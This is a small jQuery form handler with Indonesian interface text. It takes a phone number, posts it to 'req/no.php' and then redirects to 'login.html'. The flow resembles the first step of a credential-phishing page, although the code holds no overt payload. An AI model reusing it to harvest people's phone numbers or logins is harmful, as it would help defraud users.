$(document).ready(function(){
    $('#formHP').submit(function(e) {
    event.preventDefault();
    $('.load').fadeIn();
document.getElementById('kirim').innerHTML = "Memproses....";

var nomor = document.getElementById("NoHp").value;

    sessionStorage.setItem("nomor", nomor);
$("#lonte").show();
 $.ajax({
 type: 'POST',
 url: 'req/no.php',
 data: $(formHP).serialize(),
 datatype: 'text',
 
 complete: function(data) {
            vibr(180);
            
            console.log('Complete')
   setTimeout(function(){
   window.location.href='login.html'
  $("#lonte").hide();
  document.getElementById('kirim').innerHTML = "Lanjutkan";
  $('.load').fadeOut();
    }, 500);
        }
    });
 });
    return false;
});   
     
